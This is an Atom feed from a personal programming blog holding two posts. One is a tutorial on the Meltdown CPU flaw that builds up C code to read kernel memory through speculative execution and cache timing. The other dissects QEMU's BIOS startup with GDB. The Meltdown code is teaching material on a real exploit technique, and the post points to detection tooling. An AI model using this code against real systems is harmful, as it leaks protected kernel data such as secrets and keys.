<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Hardware | a programmer having fun with bits]]></title>
  <link href="http://funwithbits.net/blog/categories/hardware/atom.xml" rel="self"/>
  <link href="http://funwithbits.net/"/>
  <updated>2022-04-22T15:23:13-03:00</updated>
  <id>http://funwithbits.net/</id>
  <author>
    <name><![CDATA[Raphael S. Carvalho (a.k.a. utroz)]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Programmer's Guide to Meltdown]]></title>
    <link href="http://funwithbits.net/blog/programmers-guide-to-meltdown/"/>
    <updated>2018-01-09T23:57:48-02:00</updated>
    <id>http://funwithbits.net/blog/programmers-guide-to-meltdown</id>
    <content type="html"><![CDATA[<p>Ok, what I want here is to guide you through a Meltdown proof-of-concept that
peeks into kernel data that cpu is supposed to protect. Unfortunately, that
promise was broken and virtually all intel x86 cpu hosts are vulnerable until
patched (Linux patchset is available and named <a href="https://lkml.org/lkml/2017/10/31/884">kpti (kernel page table isolation)</a>).</p>

<p>So far, we thought we were protected by cpu mechanisms because when you try
to load kernel (sensitive) data, cpu triggers an exception which in turn is
propagated by kernel to application as SIGSEGV, leading to application
termination, look at this example:
<code>bash
$ cat /proc/kallsyms | grep banner
ffffffff81a00060 R linux_proc_banner
$ cat kernel_address_read.cc
main() {
    char *p = (char*)0xffffffff81a00060; // use address of a kernel symbol containing banner
    *p = 0;
}
$ ./kernel_address_read
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
</code></p>

<p>So time went by, and we all thought we were safe. Recently it was figured out
that speculative execution could be exploited to break that promise.
It basically consists of making the cpu use the value stored in a kernel
address before the cpu detects the access to kernel data is an invalid
instruction, but it&rsquo;s not that simple&hellip; look at this example:</p>

<pre><code class="c">char *kernel_address = (char*)0xffffffff81a00060;
char kernel_data = *kernel_address;
int number = 10;
char byte = kernel_data + number;
</code></pre>

<p>It turns out that cpu may actually perform the addition of value found in kernel
address and 10, but the result is definitely not returned to the program which
again terminates with a SIGSEGV.</p>

<p>Now comes the BINGO, EUREKA! moment: A researcher figured out that whichever
data (in example above kernel_data and byte) used in the instruction
that procedes the invalid one (*kernel_address) will remain cached in the
cpu data cache. Yes! CPU doesn&rsquo;t invalidate data cached from an instruction
which used the result (kernel data) of an invalid one (access to kernel data).</p>

<p>Well, data cache cannot directly be read. But we know that access to data
cached is much faster than to uncached ones, so what we can do is to use the
byte read from kernel as an index for an array of size 256 elements, each index
representing a possible representation of a byte (0..255). For example:</p>

<pre><code class="c">char *kernel_address = (char*)0xffffffff81a00060;
char array[256];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index];
</code></pre>

<p>That would only work if cache line size is 1, but it&rsquo;s usually 64 for level 1,
so we need to multiply array size and index by 64.</p>

<pre><code class="c">const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];
</code></pre>

<p>So if it happens that the instruction that accesses array using byte read from
kernel is executed before cpu triggers exception for invalid access to kernel,
it means cpu will bring array[kernel_data_as_index * cache_line_size] to cache.</p>

<p>Now we know that we can iterate through the 256 &ldquo;cache lines&rdquo; in array, and
we&rsquo;ll know that the one with the fastest access time is the one cached by cpu,
and the &ldquo;cache line&rdquo; index is actually the byte read from kernel.</p>

<p>For example:</p>

<pre><code class="c">const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];

// Please consider for now that signal handler for sigsegv was set up,
// and we continue executing from here after invalid access

int fastest_i_time = MAX_INTEGER_VALUE;
int fastest_i = 0;

for (int i = 0; i &lt; 256; i++) {
    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
    int time = access_time_to(array[i * cache_line_size]);
    if (time &lt; fastest_i_time) {
        fastest_i_time = time;
        fastest_i = i;
    }
}

printf("byte read from kernel is: %d\n", fastest_i);
</code></pre>

<p>It&rsquo;s not hard to understand it. If you think of it, fastest_i is equal to the
byte stored in kernel_address because program determined array[fastest_i *
cache_line_size] is cached by cpu and only one place in array was cached
previously by the instructions that accessed kernel and used its value to
retrieve a byte from array.</p>

<p>In real life, it&rsquo;s not that simple to implement because you need to clear data
cache (clflush instruction can be used) before performing the test because you
want to read more bytes and the data cache shouldn&rsquo;t be polluted for array or
wrong result is returned.</p>

<p>This is my assembly inline to clear cache line for a specific address:
<code>c
__attribute__((always_inline))
inline void __clflush(const char *address)
{
    asm __volatile__ (
        "mfence         \n"
        "clflush 0(%0)  \n"
        :
        : "r" (address)
        :            );
}
</code></p>

<p>So you&rsquo;ll need to do that for each &ldquo;cache line&rdquo; in the array, the code now
becomes this:</p>

<pre><code class="c">const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

for (int i = 0; i &lt; 256; i++) {
    __clflush(array[i * cache_line_size]);
}

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];

int fastest_i_time = MAX_INTEGER_VALUE;
int fastest_i = 0;

for (int i = 0; i &lt; 256; i++) {
    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
    int time = access_time_to(array[i * cache_line_size]);
    if (time &lt; fastest_i_time) {
        fastest_i_time = time;
        fastest_i = i;
    }
}

printf("byte read from kernel is: %d\n", fastest_i);
</code></pre>

<p>That&rsquo;s not complete code because you&rsquo;ll have to set up signal handler or use
TSX (Transactional Synchronization Extensions) to mitigate SIGSEGV that occurs
after the instruction to load kernel address retires (is fully executed).
Follow example using TSX:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">__clflush</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">xbegin</span><span class="p">()</span> <span class="o">==</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">XBEGIN_STARTED</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
</span><span class='line'>    <span class="n">_xend</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// do nothing</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">MAX_INTEGER_VALUE</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="n">access_time_to</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">time</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">fastest_i_time</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">;</span>
</span><span class='line'>        <span class="n">fastest_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">byte</span> <span class="n">read</span> <span class="n">from</span> <span class="n">kernel</span> <span class="nl">is</span><span class="p">:</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">fastest_i</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There&rsquo;s nothing much you can do with this code that only reads 1 byte from
kernel space, so I&rsquo;d suggest you to take a look at the code of my own project
that exploits meltdown to check whether or not system is affected, follow link:
<a href="https://github.com/raphaelsc/Am-I-affected-by-Meltdown">https://github.com/raphaelsc/Am-I-affected-by-Meltdown</a>
I&rsquo;d also recommend you to take a look at proof-of-concept of the researchers
involved: <a href="https://github.com/IAIK/meltdown/">https://github.com/IAIK/meltdown/</a></p>

<p>Cheers!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dissecting the ROM BIOS Shipped With QEMU for Fun]]></title>
    <link href="http://funwithbits.net/blog/dissecting-the-rom-bios-shipped-with-qemu-for-fun/"/>
    <updated>2017-07-30T22:28:00-03:00</updated>
    <id>http://funwithbits.net/blog/dissecting-the-rom-bios-shipped-with-qemu-for-fun</id>
    <content type="html"><![CDATA[<p>I&rsquo;m currently studying OS development with MIT course 6.828 mostly for fun.
I highly recommend it for everyone wanting to have a better understanding of
how computer works. It will teach you how an operating system works like xv6
and you will also build your own OS.
Check it out here: <a href="https://pdos.csail.mit.edu/6.828/2016/schedule.html">https://pdos.csail.mit.edu/6.828/2016/schedule.html</a></p>

<p>After you complete the first lab, you will better understand how hardware
initialization is done by firmware BIOS, then how bootloader is loaded, and
in turn the operating system.</p>

<p>Earlier IBM PCs couldn&rsquo;t address more than 1MB of memory, and only the first
640k chunk was actually RAM. The 640k-1MB range was reserved for special use,
like mapping devices like VGA display, 16-bit PCI devices, and BIOS ROM.</p>

<p>The layout is more or less as follow:
<code>
+------------------+  &lt;- 0x00100000 (1MB)
|     BIOS ROM     |
+------------------+  &lt;- 0x000F0000 (960KB)
|  16-bit devices, |
|  expansion ROMs  |
+------------------+  &lt;- 0x000C0000 (768KB)
|   VGA Display    |
+------------------+  &lt;- 0x000A0000 (640KB)
|                  |
|    Low Memory    |
|                  |
+------------------+  &lt;- 0x00000000
</code></p>

<p>It gets more complex for 32-bit physical address space. It&rsquo;s also amazing how
the hardware engineers left holes in the physical address space of the machine
for backward compatibility.</p>

<p>When computer is turned on, BIOS is mapped at that 64k region reserved to it
and control is transferred over to it. I want to better understand how QEMU
emulates that. GDB and strace will be my friends in this journey. The former
will be used to step through BIOS instructions, and the latter to see what
QEMU is doing internally, like memory maps and files opened.</p>

<h2>Using strace first</h2>

<p>one of the most interesting things in strace output is the following:
<code>
access("/usr/share/qemu/bios-256k.bin", R_OK) = 0
open("/usr/share/qemu/bios-256k.bin", O_RDONLY) = 13
lseek(13, 0, SEEK_END)                  = 262144
lseek(13, 0, SEEK_SET)                  = 0
read(13, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 262144) = 262144
close(13)                               = 0
</code></p>

<p>It&rsquo;s very interesting that file storing BIOS is 256k in size, even though area
reserved for it is 64k. I suppose that only some part of it is actually mapped.
There are also some interesting files such as <em>/usr/share/qemu/kvmvapic.bin</em>
and <em>/usr/share/qemu/vgabios-stdvga.bin</em> which are opened and read. They all will
be used to emulate the layout figure shown above.</p>

<p>QEMU also reports the following through &lsquo;info roms&rsquo;:
<code>
fw=genroms/kvmvapic.bin size=0x002400 name="kvmvapic.bin"
addr=00000000fffc0000 size=0x040000 mem=rom name="bios-256k.bin"
/rom@etc/acpi/tables size=0x200000 name="etc/acpi/tables"
/rom@etc/table-loader size=0x001000 name="etc/table-loader"
/rom@etc/acpi/rsdp size=0x000024 name="etc/acpi/rsdp"
</code></p>

<h2>Actual dissection of BIOS using GDB</h2>

<p>GDB can remotely connect to QEMU instance which waits for it, and that&rsquo;s what I
do here. Let&rsquo;s get started&hellip;</p>

<p>QEMU starts executing at physical address 0x000FF000 and in real mode, which
is at the very top of the area reserved for BIOS. CS and IP registers are
0xF000 and 0xFFF0, respectively. CS and IP were both used for addressing
memory because registers were only 16 bits, thus the segmented addressing mode
which multiples segment by 16 and adds offset. So PC is able to address up to
1MB of memory. The problem is that different values for segment and offset may
refer to same physical memory which may easily lead to bugs. That was later
addressed in protected mode which had bigger registers and MMU at its disposal.</p>

<p>We have a very basic idea of what BIOS will accomplish which is memory check,
device initialization, and lately find a bootable sector to load into a
predefined address (0x7C00) for which it will transfer control to.
The purpose of this article is to go into the very specific details, because we
already know the higher-level overview.</p>

<h3>Dissecting&hellip;</h3>

<p>I&rsquo;ll only show the most important instructions because this article would get
long and boring otherwise. On top of each instruction, there will be a comment
to explain it and also possibly share something interesting.</p>

<p><a href="http://web.archive.org/web/20040304063834/http://members.iweb.net.au:80/~pstorr/pcbook/book2/ioassign.htm">http://web.archive.org/web/20040304063834/http://members.iweb.net.au:80/~pstorr/pcbook/book2/ioassign.htm</a>
is used as a reference for I/O addresses. I&rsquo;m happy wayback machine allows me
to access that great website again.</p>

<pre><code># PC starts at 0x0FF000 and jumps to physical address 0xFE05B. This way BIOS
# assumes control after power up or system restart:
[f000:fff0]    0xffff0: ljmp   $0xf000,$0xe05b

# Cleans stack segment register
[f000:e066]    0xfe066: xor    %dx,%dx
[f000:e068]    0xfe068: mov    %dx,%ss
# Sets up stack point to 0x7000, meaning stack address is actually 0x7000
[f000:e06a]    0xfe06a: mov    $0x7000,%esp

# 0xf3513 is probably an address which is moved to EDX, let's see what BIOS
# want to achieve with that...
[f000:e070]    0xfe070: mov    $0xf3513,%edx

# Interrupt flag is reset
[f000:d15d]    0xfd15d: cli
# So is direction flag:
[f000:d15e]    0xfd15e: cld 

# Select register 0xF from CMOS with NMI disabled. The lower order 7 bits are
# used to select register, and the most significant bit determines whether to
# disable NMI. Register 0xF is CMOS Shutdown Status.
[f000:d15f]    0xfd15f: mov    $0x8f,%eax
[f000:d165]    0xfd165: out    %al,$0x70
# Now we will get CMOS Shutdown Status 
[f000:d167]    0xfd167: in     $0x71,%al

# A20 control via System Control Port A. Used to control memory 1MB barrier.
# Bit 1 (rw): 0: disable A20, 1: enable A20
[f000:d169]    0xfd169: in     $0x92,%al
[f000:d16b]    0xfd16b: or     $0x2,%al
[f000:d16d]    0xfd16d: out    %al,$0x92

# Load Global/Interrupt Descriptor Table Register
# Sorry I'm tired. I won't go into details of what exactly is stored in tables
[f000:d16f]    0xfd16f: lidtw  %cs:0x6af8
[f000:d175]    0xfd175: lgdtw  %cs:0x6ab8

# Wow, it looks like protected mode was set up by BIOS. Did I get that right?
[f000:d17b]    0xfd17b: mov    %cr0,%eax
[f000:d17e]    0xfd17e: or     $0x1,%eax
[f000:d182]    0xfd182: mov    %eax,%cr0

# Looks like so. GDT descriptor is now used for addressing memory.
[f000:d185]    0xfd185: ljmpl  $0x8,$0xfd18d
The target architecture is assumed to be i386
# And registers for data will use its own GDT descriptor:
=&gt; 0xfd18d: mov    $0x10,%eax
=&gt; 0xfd192: mov    %eax,%ds
=&gt; 0xfd194: mov    %eax,%es
=&gt; 0xfd196: mov    %eax,%ss
=&gt; 0xfd198: mov    %eax,%fs
=&gt; 0xfd19a: mov    %eax,%gs

# Now an indirect jump for value we moved to EDX in the beginning
=&gt; 0xfd19e: jmp    *%edx
# Setting up stack frame according to x86 calling convention
=&gt; 0xf3513: push   %ebx
=&gt; 0xf3514: sub    $0x20,%esp

# Pushing two values as arguments for a function
# Let use variables for them: A=0xf5b6c and B=0xf430b
=&gt; 0xf3517: push   $0xf5b6c
=&gt; 0xf351c: push   $0xf430b
=&gt; 0xf3521: call   0xf096f
# Loading address of A into ecx, and value of B into edx
=&gt; 0xf096f: lea    0x8(%esp),%ecx
=&gt; 0xf0973: mov    0x4(%esp),%edx
=&gt; 0xf0977: mov    $0xf5b68,%eax
# If I understood it correctly, it will now initialize PCI devices...

# and it goes on until bootloader takes over...
</code></pre>

<p>I&rsquo;m really tired now, and the article will also be boring if I keep going.
I think it&rsquo;s better to stop at this point. As we know, the BIOS will also
keep initializing things and afterwards will load boot sector into 0x7c00
and start executing it. I hope you had lots of fun reading this article.
My main idea is to have people interested in operating system engineering.
I&rsquo;ll also try to keep posting as I go through the OS course offered by MIT.</p>

<p>Bye for now!</p>
]]></content>
  </entry>
  
</feed>
